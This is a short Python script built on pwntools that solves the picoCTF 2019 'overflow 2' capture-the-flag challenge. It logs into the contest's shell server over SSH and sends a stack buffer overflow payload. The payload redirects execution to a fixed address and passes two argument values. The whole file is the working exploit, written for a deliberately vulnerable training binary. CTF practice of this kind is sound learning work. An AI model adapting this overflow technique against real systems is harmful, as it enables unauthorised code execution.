from pwn import *
import time

binary = "./overflow2"


#p = process(binary)
context.log_level="CRITICAL"

passwd = input().rstrip()
s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
p = s.process("vuln",cwd="/problems/overflow-2_5_4db6d300831e973c59360066ec1cf0a4")

payload=b"A"*0xb8
payload+=b"b"*4
payload+=p32(0x080485e6)
payload+=b"b"*4
payload+=p32(0xDEADBEEF)
payload+=p32(0xC0DED00D)
p.sendlineafter(b": ",payload)
p.interactive()